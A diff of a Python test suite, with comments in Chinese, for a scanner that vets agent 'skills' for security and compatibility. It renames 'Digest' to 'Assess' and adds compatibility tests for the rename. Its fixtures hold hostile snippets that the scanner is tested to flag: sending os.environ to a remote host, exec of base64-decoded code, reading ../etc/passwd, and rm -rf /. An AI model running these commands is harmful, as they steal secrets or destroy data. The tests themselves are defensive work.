@@ -1,14 +1,14 @@
-"""评审-消化扩展评估（Digest Assessor）单元测试
+"""评审-评估扩展评估（Skill Assessor）单元测试
 
 覆盖用户要求的自动验证清单（确定性规则层）：
 - 安全：权限校验（env/popen/路径）、攻击面（SSL/混淆/疑似外传）、数据合规（PII/密钥入参/敏感收集）
 - 兼容性：名称冲突 / 操作重叠 / 资源竞争(超时/死循环) / 交互冲突(共享触发词) / 重复合并建议
-- 自动执行：create/install/update 后自动评估（不改 draft 状态）、digest_all 批量补评
+- 自动执行：create/install/update 后自动评估（不改 draft 状态）、assess_all 批量补评
 """
 import pytest
 
 from agent.skills_mgmt import SkillsMgmtService
-from agent.skills_mgmt.assessor import SkillDigestAssessor
+from agent.skills_mgmt.assessor import SkillAssessor
 from agent.skills_mgmt.models import Skill, SkillStatus
 
 
@@ -37,68 +37,68 @@ def _codes(assessment):
 #  安全维度：权限 / 攻击面 / 数据合规
 # ═══════════════════════════════════════════════════════════════
 
-class TestSecurityDigest:
+class TestSecurityAssess:
     def test_benign_markdown_no_findings(self):
-        a = SkillDigestAssessor().assess(_skill())
+        a = SkillAssessor().assess(_skill())
         assert a.blocked is False
         assert a.compatibility_score == 100.0
 
     def test_env_access_info(self):
-        a = SkillDigestAssessor().assess(_skill(
+        a = SkillAssessor().assess(_skill(
             content_type="python", content="import os\nprint(os.environ)\n"))
         assert "SEC_ENV_ACCESS" in _codes(a)
 
     def test_popen_warn(self):
-        a = SkillDigestAssessor().assess(_skill(
+        a = SkillAssessor().assess(_skill(
             content_type="python", content="import os\nos.popen('ls')\n"))
         assert "SEC_POPEN" in _codes(a)
 
     def test_path_traversal_warn(self):
-        a = SkillDigestAssessor().assess(_skill(
+        a = SkillAssessor().assess(_skill(
             content_type="python",
             content="open('../etc/passwd').read()\n"))
         assert "SEC_PATH_TRAVERSAL" in _codes(a)
 
     def test_env_exfil_warn_when_env_plus_network(self):
-        a = SkillDigestAssessor().assess(_skill(
+        a = SkillAssessor().assess(_skill(
             content_type="python",
             content="import os, requests\nrequests.post('https://x', data=os.environ)\n"))
         assert "SEC_ENV_EXFIL" in _codes(a)
 
     def test_ssl_unverified_warn(self):
-        a = SkillDigestAssessor().assess(_skill(
+        a = SkillAssessor().assess(_skill(
             content_type="python",
             content="requests.get('https://x', verify=False)\n"))
         assert "SEC_SSL_UNVERIFIED" in _codes(a)
 
     def test_obfuscated_b64_eval_warn(self):
-        a = SkillDigestAssessor().assess(_skill(
+        a = SkillAssessor().assess(_skill(
             content_type="python",
             content="exec(base64.b64decode('cHJpbnQoMSk='))\n"))
         assert "SEC_OBFUSCATED" in _codes(a)
 
     def test_pii_in_content_warn(self):
-        a = SkillDigestAssessor().assess(_skill(
+        a = SkillAssessor().assess(_skill(
             content="示例手机号 13800138000 与身份证 110101199003078123\n"))
         assert "DATA_PII" in _codes(a)
 
     def test_secret_in_default_params_warn(self):
-        a = SkillDigestAssessor().assess(_skill(
+        a = SkillAssessor().assess(_skill(
             default_params={"api_key": "sk-ABCDEFGH12345678"}))
         assert "DATA_SECRET_IN_PARAMS" in _codes(a)
 
     def test_personal_collect_suggests_sensitive(self):
-        a = SkillDigestAssessor().assess(_skill(
+        a = SkillAssessor().assess(_skill(
             description="本技能会收集用户的手机号与隐私信息", is_sensitive=False))
         assert "DATA_COLLECT_SENSITIVE" in _codes(a)
         # 已标记 sensitive 则不再提示
-        a2 = SkillDigestAssessor().assess(_skill(
+        a2 = SkillAssessor().assess(_skill(
             description="本技能会收集用户的手机号与隐私信息", is_sensitive=True))
         assert "DATA_COLLECT_SENSITIVE" not in _codes(a2)
 
     def test_non_code_content_skips_code_patterns(self):
         """markdown 里出现 print(os.environ) 不应误报为代码权限问题"""
-        a = SkillDigestAssessor().assess(_skill(
+        a = SkillAssessor().assess(_skill(
             content="说明：技能会用到 print(os.environ) 这种写法吗？不会。"))
         assert "SEC_ENV_ACCESS" not in _codes(a)
 
@@ -107,33 +107,33 @@ class TestSecurityDigest:
 #  兼容性维度：冲突 / 重叠 / 资源 / 交互 / 重复建议
 # ═══════════════════════════════════════════════════════════════
 
-class TestCompatibilityDigest:
+class TestCompatibilityAssess:
     def test_reserved_id_blocks(self):
-        a = SkillDigestAssessor().assess(_skill(id="self_reflection"), reserved=["self_reflection"])
+        a = SkillAssessor().assess(_skill(id="self_reflection"), reserved=["self_reflection"])
         assert a.blocked is True
         assert "NAT_RESERVED_ID" in _codes(a)
 
     def test_name_clash_with_other_skill(self):
         target = _skill(id="new-one", name="Same Name", description="aaaa 描述段内容足够区分")
         other = _skill(id="old-one", name="Same Name", description="bbbb 另一个技能的描述文本")
-        a = SkillDigestAssessor().assess(target, others=[other])
+        a = SkillAssessor().assess(target, others=[other])
         assert "NAT_NAME_CLASH" in _codes(a)
 
     def test_operation_overlap_warn(self):
         target = _skill(id="parser-a", name="PDF解析器A", description="把 PDF 文档内容抽取出来")
         other = _skill(id="parser-b", name="PDF解析器B", description="抽取 PDF 文档的正文内容")
-        a = SkillDigestAssessor().assess(target, others=[other])
+        a = SkillAssessor().assess(target, others=[other])
         assert "OVL_OPERATION_OVERLAP" in _codes(a)
 
     def test_resource_timeout_warns_for_code(self):
-        a = SkillDigestAssessor().assess(_skill(
+        a = SkillAssessor().assess(_skill(
             content_type="python",
             content="import subprocess\nsubprocess.run(['ls'])\n"
                     "import requests\nrequests.get('https://x')\n"))
         assert "RSC_SUBPROCESS_NO_TIMEOUT" in _codes(a)
         assert "RSC_NET_NO_TIMEOUT" in _codes(a)
         # 带 timeout 不再告警
-        a2 = SkillDigestAssessor().assess(_skill(
+        a2 = SkillAssessor().assess(_skill(
             content_type="python",
             content="import subprocess\nsubprocess.run(['ls'], timeout=10)\n"
                     "import requests\nrequests.get('https://x', timeout=5)\n"))
@@ -143,30 +143,30 @@ class TestCompatibilityDigest:
     def test_shared_trigger_interaction_conflict(self):
         target = _skill(id="skill-a", content="tool: pdf_parse 负责解析PDF")
         other = _skill(id="skill-b", content="tool: pdf_parse 也声明处理PDF")
-        a = SkillDigestAssessor().assess(target, others=[other])
+        a = SkillAssessor().assess(target, others=[other])
         assert "INT_SHARED_TRIGGER" in _codes(a)
 
     def test_duplicate_merge_recommendation(self):
         content = "# 解析PDF\n提取正文与元数据\n代码片段略"
         target = _skill(id="dup-a", content=content, description="解析 PDF 的工具技能")
         other = _skill(id="dup-b", content=content, description="另一个解析 PDF 的工具技能")
-        a = SkillDigestAssessor().assess(target, others=[other])
+        a = SkillAssessor().assess(target, others=[other])
         assert "DUP_MERGE_RECOMMEND" in _codes(a)
 
     def test_compat_score_penalized(self):
         target = _skill(id="parser-a", name="PDF解析器", description="把 PDF 文档内容抽取出来")
         other = _skill(id="parser-b", name="PDF解析器", description="抽取 PDF 文档的正文内容")
-        a = SkillDigestAssessor().assess(target, others=[other])
+        a = SkillAssessor().assess(target, others=[other])
         assert a.compatibility_score < 100.0
 
 
 # ═══════════════════════════════════════════════════════════════
-#  代码级审查（code_review 接入 digest）
+#  代码级审查（code_review 接入评估）
 # ═══════════════════════════════════════════════════════════════
 
 class TestCodeReviewIntegration:
     def test_sql_concat_code_flagged_in_code_category(self):
-        a = SkillDigestAssessor().assess(_skill(
+        a = SkillAssessor().assess(_skill(
             content_type="python",
             content=(
                 "def query(uid):\n"
@@ -181,7 +181,7 @@ class TestCodeReviewIntegration:
         assert any(f.category == "code" for f in a.findings)
 
     def test_benign_code_no_security_code_findings(self):
-        a = SkillDigestAssessor().assess(_skill(
+        a = SkillAssessor().assess(_skill(
             content_type="python",
             content=(
                 "def add(a, b):\n"
@@ -192,7 +192,7 @@ class TestCodeReviewIntegration:
         assert not any(f.code == "CR_安全" for f in a.findings)
 
     def test_non_code_content_skips_code_review(self):
-        a = SkillDigestAssessor().assess(_skill(
+        a = SkillAssessor().assess(_skill(
             content_type="markdown", content="SELECT 相关的说明文档（非代码）"))
         assert not any(f.category == "code" for f in a.findings)
 
@@ -219,8 +219,8 @@ class TestSelectiveDimensionsAndExternalPrecheck:
         assert _code_review_dimensions(md) == []
 
     def test_external_install_precheck_merged_and_blocks(self):
-        """github 外来技能含 subprocess → SEC_EXT_INSTALL error，digest 阻断"""
-        a = SkillDigestAssessor().assess(_skill(
+        """github 外来技能含 subprocess → SEC_EXT_INSTALL error，评估阻断"""
+        a = SkillAssessor().assess(_skill(
             id="ext-skill", source="github:someone/repo",
             content_type="python",
             content="import subprocess\nsubprocess.run(['rm', '-rf', '/'])\n"))
@@ -232,14 +232,14 @@ class TestSelectiveDimensionsAndExternalPrecheck:
         assert a.blocked is True
 
     def test_self_built_skill_not_subject_to_external_gate(self):
-        a = SkillDigestAssessor().assess(_skill(
+        a = SkillAssessor().assess(_skill(
             id="self-skill", source="manual",
             content_type="python",
             content="import subprocess\nsubprocess.run(['ls'])\n"))
         assert not any(f.code == "SEC_EXT_INSTALL" for f in a.findings)
 
     def test_external_benign_no_precheck_findings(self):
-        a = SkillDigestAssessor().assess(_skill(
+        a = SkillAssessor().assess(_skill(
             id="ext-ok", source="url:https://x/skill.json",
             content_type="python", content="def f(x):\n    return x\n"))
         assert not any(f.code == "SEC_EXT_INSTALL" for f in a.findings)
@@ -297,18 +297,18 @@ class TestAuditLogRead:
 #  可配置开关（env/config）与脚本文件全维度审查
 # ═══════════════════════════════════════════════════════════════
 
-class TestDigestKnobsAndScriptScan:
+class TestAssessKnobsAndScriptScan:
     def test_env_knob_disables_external_precheck(self, monkeypatch):
-        monkeypatch.setenv("SKILLS_DIGEST_EXTERNAL_PRECHECK_ENABLED", "false")
-        a = SkillDigestAssessor().assess(_skill(
+        monkeypatch.setenv("SKILLS_ASSESS_EXTERNAL_PRECHECK_ENABLED", "false")
+        a = SkillAssessor().assess(_skill(
             id="ext-skill", source="github:someone/repo",
             content_type="python",
             content="import subprocess\nsubprocess.run(['rm', '-rf', '/'])\n"))
         assert not any(f.code == "SEC_EXT_INSTALL" for f in a.findings)
 
     def test_env_knob_downgrades_high_risk(self, monkeypatch):
-        monkeypatch.setenv("SKILLS_DIGEST_BLOCK_ON_HIGH_RISK_EXTERNAL", "false")
-        a = SkillDigestAssessor().assess(_skill(
+        monkeypatch.setenv("SKILLS_ASSESS_BLOCK_ON_HIGH_RISK_EXTERNAL", "false")
+        a = SkillAssessor().assess(_skill(
             id="ext-skill", source="github:someone/repo",
             content_type="python",
             content="import subprocess\nsubprocess.run(['rm', '-rf', '/'])\n"))
@@ -317,8 +317,8 @@ class TestDigestKnobsAndScriptScan:
         assert a.blocked is False
 
     def test_env_knob_disables_code_review(self, monkeypatch):
-        monkeypatch.setenv("SKILLS_DIGEST_CODE_REVIEW_ENABLED", "false")
-        a = SkillDigestAssessor().assess(_skill(
+        monkeypatch.setenv("SKILLS_ASSESS_CODE_REVIEW_ENABLED", "false")
+        a = SkillAssessor().assess(_skill(
             content_type="python",
             content="cur.execute('SELECT * FROM t WHERE id=' + uid)\n"))
         assert not any(f.category == "code" for f in a.findings)
@@ -340,11 +340,11 @@ class TestDigestKnobsAndScriptScan:
             ),
             "content_type": "python", "category": "custom",
             "config_schema": {"type": "object", "properties": {"task": {"type": "string"}}},
-            "tags": ["digest", "test", "demo"], "author": "tester",
+            "tags": ["assess", "test", "demo"], "author": "tester",
         }
 
     def test_script_files_review_merged_and_blocks(self, tmp_path, monkeypatch):
-        """repo/<id>/scripts/*.py 含高风险代码 → digest 合并 SEC_FILE_SCRIPT 且阻断"""
+        """repo/<id>/scripts/*.py 含高风险代码 → 评估合并 SEC_FILE_SCRIPT 且阻断"""
         repo = tmp_path / "repo"
         store = tmp_path / "skills.json"
         svc = SkillsMgmtService(store_path=str(store), repo_path=str(repo))
@@ -360,11 +360,11 @@ class TestDigestKnobsAndScriptScan:
         codes = [f.code for f in r.findings]
         assert "SEC_FILE_SCRIPT" in codes, codes
         assert r.status in ("warn", "failed"), r.status
-        assert r.digest_verdict == "block"
+        assert r.review_verdict == "block"
         assert svc.get("scr-skill").status in ("pending_review", "rejected")
 
     def test_script_scan_off_skips(self, tmp_path, monkeypatch):
-        monkeypatch.setenv("SKILLS_DIGEST_SCRIPT_PRECHECK_ENABLED", "false")
+        monkeypatch.setenv("SKILLS_ASSESS_SCRIPT_PRECHECK_ENABLED", "false")
         repo = tmp_path / "repo"
         svc = SkillsMgmtService(store_path=str(tmp_path / "skills.json"),
                                 repo_path=str(repo))
@@ -379,14 +379,14 @@ class TestDigestKnobsAndScriptScan:
     def test_blocking_severities_configurable(self, monkeypatch):
         """阻断严重级可配置：仅 critical 视为阻断时，error 不再阻断"""
         # 默认：error 阻断
-        a = SkillDigestAssessor().assess(_skill(
+        a = SkillAssessor().assess(_skill(
             id="ext-skill", source="github:someone/repo",
             content_type="python",
             content="import subprocess\nsubprocess.run(['rm', '-rf', '/'])\n"))
         assert a.blocked is True
         # 配置只保留 critical → 高风险(error)不阻断
-        monkeypatch.setenv("SKILLS_DIGEST_BLOCKING_SEVERITIES", "critical")
-        a2 = SkillDigestAssessor().assess(_skill(
+        monkeypatch.setenv("SKILLS_ASSESS_BLOCKING_SEVERITIES", "critical")
+        a2 = SkillAssessor().assess(_skill(
             id="ext-skill", source="github:someone/repo",
             content_type="python",
             content="import subprocess\nsubprocess.run(['rm', '-rf', '/'])\n"))
@@ -419,7 +419,7 @@ class TestDailyArchiveAndCurate:
         from datetime import date as _date
         from agent.skills_mgmt.log_archiver import archive_daily_file
         today = _date.today().isoformat()
-        p = tmp_path / "skills_digest_events.jsonl"
+        p = tmp_path / "skills_assessment_events.jsonl"
         old1 = '{"ts":"2026-08-31T10:00:00","skill_id":"a","kind":"auto","verdict":"ok"}\n'
         old2 = '{"ts":"2026-09-01T10:00:00","skill_id":"b","kind":"auto","verdict":"ok"}\n'
         new1 = '{"ts":"%sT10:00:00","skill_id":"c","kind":"auto","verdict":"ok"}\n' % today
@@ -430,7 +430,7 @@ class TestDailyArchiveAndCurate:
         remain = p.read_text(encoding="utf-8").splitlines()
         assert len(remain) == 1 and '"skill_id":"c"' in remain[0]
         # 归档文件按日生成（这里用今天的真实日期名由逻辑生成——测试模拟昨日由 monkeypatch 日期更稳，见下断言宽松）
-        files = [f for f in out["files"] if "skills_digest_events-" in f]
+        files = [f for f in out["files"] if "skills_assessment_events-" in f]
         assert files, out
 
     def test_suggest_fixes_maps_review_findings(self, svc):
@@ -511,11 +511,11 @@ class TestDailyArchiveAndCurate:
 
 
 # ═══════════════════════════════════════════════════════════════
-#  自动执行：create/install/update 钩子 + digest_all 批量
+#  自动执行：create/install/update 钩子 + assess_all 批量
 # ═══════════════════════════════════════════════════════════════
 
-class TestAutoDigestHooks:
-    def _data(self, name="digest-skill", **overrides):
+class TestAutoAssessHooks:
+    def _data(self, name="assess-skill", **overrides):
         data = {
             "id": name, "name": name,
             "description": "一个用于自动化测试的技能描述，覆盖较多样本保证质量评估通过",
@@ -533,7 +533,7 @@ class TestAutoDigestHooks:
             ),
             "content_type": "python", "category": "custom",
             "config_schema": {"type": "object", "properties": {"task": {"type": "string"}}},
-            "tags": ["digest", "test", "demo"], "author": "tester",
+            "tags": ["assess", "test", "demo"], "author": "tester",
         }
         data.update(overrides)
         return data
@@ -543,7 +543,7 @@ class TestAutoDigestHooks:
         assert skill.status == SkillStatus.DRAFT.value, "创建仍为 draft（守原契约）"
         assert skill.review is not None
         assert skill.review.auto_assessed is True
-        assert skill.review.digest_verdict in ("ok", "block")
+        assert skill.review.review_verdict in ("ok", "block")
 
     def test_create_with_pii_reports_finding(self, svc):
         skill = svc.create_manual(self._data(name="pii-skill",
@@ -552,18 +552,18 @@ class TestAutoDigestHooks:
         codes = [f.code for f in skill.review.findings]
         assert "DATA_PII" in codes
 
-    def test_review_runs_full_digest_and_approves_benign(self, svc):
-        skill = svc.create_manual(self._data(name="good-digest"))
+    def test_review_runs_full_review_and_approves_benign(self, svc):
+        skill = svc.create_manual(self._data(name="good-assess"))
         assert skill.status == "draft"
-        # 正式审核（= 权威评审-消化）
-        r = svc.digest_skill(skill.id)
+        # 正式审核（= 权威评审-评估）
+        r = svc.review_skill(skill.id)
         assert r.status in ("passed", "warn", "pending")
         assert r.auto_assessed is True
-        assert r.digest_verdict == "ok"
+        assert r.review_verdict == "ok"
         assert r.compatibility_score == 100.0
         assert svc.get(skill.id).status in ("approved", "pending_review")
 
-    def test_digest_all_assesses_existing_without_review(self, svc, tmp_path):
+    def test_assess_all_assesses_existing_without_review(self, svc, tmp_path):
         # 直接绕过 create 钩子塞入一个无 review 的存量技能
         from agent.skills_mgmt.models import Skill as SK
         svc.store.upsert(SK.from_storage_dict({
@@ -573,7 +573,7 @@ class TestAutoDigestHooks:
             "content_type": "python", "category": "custom",
             "tags": ["legacy"], "author": "tester",
         }))
-        result = svc.digest_all()
+        result = svc.assess_all()
         assert result["total"] >= 1
         assert result["assessed"] == 1
         got = svc.get("legacy-skill")
@@ -585,8 +585,8 @@ class TestAutoDigestHooks:
 #  全部动态聚合流分页 + 斜杠命令注册表（本轮新增契约）
 # ═══════════════════════════════════════════════════════════════
 
-class TestDigestFeedPagination:
-    """digest_feed(limit, offset)：digest 事件 + 审计记录合并、时间倒序、分页切片。"""
+class TestAssessFeedPagination:
+    """assessment_feed(limit, offset)：评估事件 + 审计记录合并、时间倒序、分页切片。"""
 
     def test_merge_sort_desc_and_slice(self, svc):
         events = [
@@ -603,16 +603,16 @@ class TestDigestFeedPagination:
             {"ts": "2026-01-01T07:00:00", "kind": "review", "skill_id": "d",
              "actor": "admin", "reason": "复核通过", "verdict": ""},
         ]
-        svc.digest_events = lambda limit=50: events[-limit:][::-1]  # type: ignore[assignment]
+        svc.assessment_events = lambda limit=50: events[-limit:][::-1]  # type: ignore[assignment]
         svc.audit_log = lambda limit=100, skill_id="", offset=0, since="": audit  # type: ignore[assignment]
 
-        page1 = svc.digest_feed(limit=3, offset=0)
+        page1 = svc.assessment_feed(limit=3, offset=0)
         assert [r["ts"] for r in page1] == [
             "2026-01-01T10:00:00", "2026-01-01T09:30:00", "2026-01-01T09:00:00"]
         assert page1[1]["kind"] == "audit"
-        assert page1[0]["kind"] == "digest"
+        assert page1[0]["kind"] == "assess"
 
-        page2 = svc.digest_feed(limit=3, offset=3)
+        page2 = svc.assessment_feed(limit=3, offset=3)
         assert [r["ts"] for r in page2] == [
             "2026-01-01T08:00:00", "2026-01-01T07:00:00"]
         # 两页无重叠（分页切片正确）
@@ -620,9 +620,9 @@ class TestDigestFeedPagination:
         assert len(all_ts) == len(set(all_ts))
 
     def test_feed_empty(self, svc):
-        svc.digest_events = lambda limit=50: []  # type: ignore[assignment]
+        svc.assessment_events = lambda limit=50: []  # type: ignore[assignment]
         svc.audit_log = lambda limit=100, skill_id="", offset=0, since="": []  # type: ignore[assignment]
-        assert svc.digest_feed(limit=10, offset=0) == []
+        assert svc.assessment_feed(limit=10, offset=0) == []
 
     def test_feed_filter_by_skill_id(self, svc):
         events = [
@@ -637,20 +637,20 @@ class TestDigestFeedPagination:
             {"ts": "2026-01-01T09:30:00", "kind": "review", "skill_id": "beta-2",
              "actor": "admin", "reason": "放行", "verdict": ""},
         ]
-        svc.digest_events = lambda limit=50: events[-limit:][::-1]  # type: ignore[assignment]
+        svc.assessment_events = lambda limit=50: events[-limit:][::-1]  # type: ignore[assignment]
         svc.audit_log = lambda limit=100, skill_id="", offset=0, since="": audit  # type: ignore[assignment]
 
-        only = svc.digest_feed(limit=50, offset=0, skill_id="alpha")
+        only = svc.assessment_feed(limit=50, offset=0, skill_id="alpha")
         # 时间倒序：alpha-1(10:00) 新于 alpha-3(08:00)
         assert [r["skill_id"] for r in only] == ["alpha-1", "alpha-3"]
         assert all("alpha" in r["skill_id"] for r in only)
 
-        exact = svc.digest_feed(limit=50, offset=0, skill_id="beta-2")
-        # 包含匹配：beta-2 的 digest 事件 + 审计都命中，倒序
+        exact = svc.assessment_feed(limit=50, offset=0, skill_id="beta-2")
+        # 包含匹配：beta-2 的 评估事件 + 审计都命中，倒序
         assert [r["skill_id"] for r in exact] == ["beta-2", "beta-2"]
         assert exact[0]["kind"] == "audit"
 
-        none = svc.digest_feed(limit=50, offset=0, skill_id="gamma")
+        none = svc.assessment_feed(limit=50, offset=0, skill_id="gamma")
         assert none == []
 
 
@@ -704,7 +704,7 @@ class TestNativeDuplicateRule:
     """外来/新建技能与系统内置能力重叠 → warn 增量吸收提示（不再 error 阻断/拒绝）。"""
 
     def test_duplicate_memory_summary_advisory(self):
-        a = SkillDigestAssessor().assess(_skill(
+        a = SkillAssessor().assess(_skill(
             id="ext-mem", name="外部记忆摘要助手",
             description="压缩对话历史生成结构化摘要",
             content="# 用法\n把长对话总结为记忆摘要，定期归档"))
@@ -717,14 +717,14 @@ class TestNativeDuplicateRule:
         assert a.blocked is False              # 重叠不阻断
 
     def test_duplicate_voice_interaction_advisory(self):
-        a = SkillDigestAssessor().assess(_skill(
+        a = SkillAssessor().assess(_skill(
             id="ext-voice", name="语音助手", description="通过语音交互完成任务",
             content="voice_interaction 实现语音对话"))
         assert any(f.code == "DUP_NATIVE_FUNC" for f in a.findings)
         assert a.blocked is False
 
     def test_unique_skill_not_flagged(self):
-        a = SkillDigestAssessor().assess(_skill(
+        a = SkillAssessor().assess(_skill(
             id="ext-pdf", name="pdf-extractor",
             description="解析 PDF 提取表格与正文",
             content="# 用法\n读取 pdf 文件，输出结构化正文"))
@@ -829,3 +829,108 @@ class TestAutoFixRule:
         assert out["applied"] == []
         assert set(out["already_fixed"]) <= {"QUAL_NO_SCHEMA", "QUAL_NO_TAGS"}
         assert out["refreshed"] is False
+
+
+# ═══════════════════════════════════════════════════════════════
+#  兼容验证（TASK-S0-01 更名收敛）：旧名 digest=评审语义 仅剩别名/旧档可读
+# ═══════════════════════════════════════════════════════════════
+
+class TestRenameCompat:
+    """旧名（digest=评审语义，与 v7.2 内化语义无关）在新名下仍可用的兼容验证。"""
+
+    def test_legacy_class_and_function_aliases(self):
+        from agent.skills_mgmt.assessor import (
+            SkillAssessor, SkillDigestAssessor,
+            AssessmentResult, DigestAssessment,
+            assess_flag, digest_flag,
+            blocking_severities, digest_blocking_severities,
+        )
+        assert SkillDigestAssessor is SkillAssessor
+        assert DigestAssessment is AssessmentResult
+        assert assess_flag("code_review_enabled", True) is True
+        assert digest_flag("code_review_enabled", True) is True
+        assert blocking_severities() == digest_blocking_severities()
+
+    def test_legacy_env_prefix_still_read(self, monkeypatch):
+        """旧前缀 SKILLS_DIGEST_*（评审语义）经兼容层仍可读取。"""
+        monkeypatch.setenv("SKILLS_DIGEST_EXTERNAL_PRECHECK_ENABLED", "false")
+        a = SkillAssessor().assess(_skill(
+            id="ext-skill", source="github:someone/repo",
+            content_type="python",
+            content="import subprocess\nsubprocess.run(['rm', '-rf', '/'])\n"))
+        assert not any(f.code == "SEC_EXT_INSTALL" for f in a.findings)
+
+    def test_review_verdict_legacy_alias_and_storage_read(self):
+        """review_verdict 为主；旧字段名/旧存储键 digest_verdict 读入兼容。"""
+        from agent.skills_mgmt.models import ReviewResult, Skill as SK
+        r1 = ReviewResult(review_verdict="block")
+        assert r1.review_verdict == "block"
+        assert r1.digest_verdict == "block"          # 属性别名（旧名）
+        r1.digest_verdict = "ok"                      # 属性别名可写
+        assert r1.review_verdict == "ok"
+        # 旧存储档 review.digest_verdict → 归一为 review_verdict
+        raw = {
+            "id": "legacy-rv", "name": "legacy-rv", "category": "custom",
+            "description": "旧档读取兼容验证",
+            "content": "# x", "content_type": "markdown",
+            "review": {"status": "warn", "digest_verdict": "block",
+                       "auto_assessed": True},
+        }
+        s = SK.from_storage_dict(raw)
+        assert s.review.review_verdict == "block"
+        assert s.review.digest_verdict == "block"    # 别名读
+        dumped = s.model_dump()
+        assert dumped["review"]["review_verdict"] == "block"
+        assert "digest_verdict" not in dumped["review"]  # 落盘只写新键
+
+    def test_service_legacy_aliases(self, svc):
+        skill = svc.create_manual(TestAutoAssessHooks()._data(name="alias-skill"))
+        # digest_skill == review_skill（均为权威评审）
+        r_new = svc.review_skill(skill.id)
+        assert r_new.review_verdict in ("ok", "block")
+        r_old = svc.digest_skill(skill.id)
+        assert r_old.review_verdict == r_new.review_verdict
+        # assess_all / digest_all 等价
+        res = svc.assess_all()
+        assert set(res) >= {"total", "assessed", "blocked"}
+        assert svc.digest_all() == res
+        # assessment_feed / digest_feed 等价（同一数据源）
+        assert svc.digest_feed(limit=5) == svc.assessment_feed(limit=5)
+
+    def test_events_file_legacy_migration(self, tmp_path, monkeypatch):
+        from agent.skills_mgmt import log_archiver as la
+        monkeypatch.setattr(la, "repo_data_dir", lambda: tmp_path)
+        legacy = tmp_path / la.LEGACY_DIGEST_EVENTS_BASENAME
+        legacy.write_text(
+            '{"ts":"2026-09-01T10:00:00","kind":"auto",'
+            '"skill_id":"a","verdict":"ok"}\n', encoding="utf-8")
+        active = la.active_events_file()
+        assert active.name == la.ASSESSMENT_EVENTS_BASENAME
+        # 首用迁移：旧内容 copy 进新文件；旧文件保留只读兼容
+        assert active.exists() and legacy.exists()
+        assert active.read_text(encoding="utf-8") == legacy.read_text(
+            encoding="utf-8")
+        both = la.events_files()
+        assert both["primary"].name == la.ASSESSMENT_EVENTS_BASENAME
+        assert both["legacy"].name == la.LEGACY_DIGEST_EVENTS_BASENAME
+
+    def test_route_surface_dual_registration(self):
+        """旧 /digest/* 与新 /assess/* 路由并存（同 handler，评审语义）。"""
+        from flask import Flask
+        from agent.server_routes import routes_skills_mgmt as rsm
+        app = Flask(__name__)
+        rsm.register_routes(app, None)
+        rules = {str(r) for r in app.url_map.iter_rules()}
+        for new, old in (
+            ("/api/skills-mgmt/assess/run-all", "/api/skills-mgmt/digest/run-all"),
+            ("/api/skills-mgmt/assess/curate", "/api/skills-mgmt/digest/curate"),
+            ("/api/skills-mgmt/assess/feed", "/api/skills-mgmt/digest/feed"),
+            ("/api/skills-mgmt/assess/events", "/api/skills-mgmt/digest/events"),
+            ("/api/skills-mgmt/assess/stream", "/api/skills-mgmt/digest/stream"),
+            ("/api/skills-mgmt/assess/merge-safe", "/api/skills-mgmt/digest/merge-safe"),
+            ("/api/skills-mgmt/assess/merge-backups", "/api/skills-mgmt/digest/merge-backups"),
+            ("/api/skills-mgmt/assess/merge-undo", "/api/skills-mgmt/digest/merge-undo"),
+            ("/api/skills-mgmt/assess/<skill_id>", "/api/skills-mgmt/digest/<skill_id>"),
+        ):
+            assert new in rules, new
+            assert old in rules, old
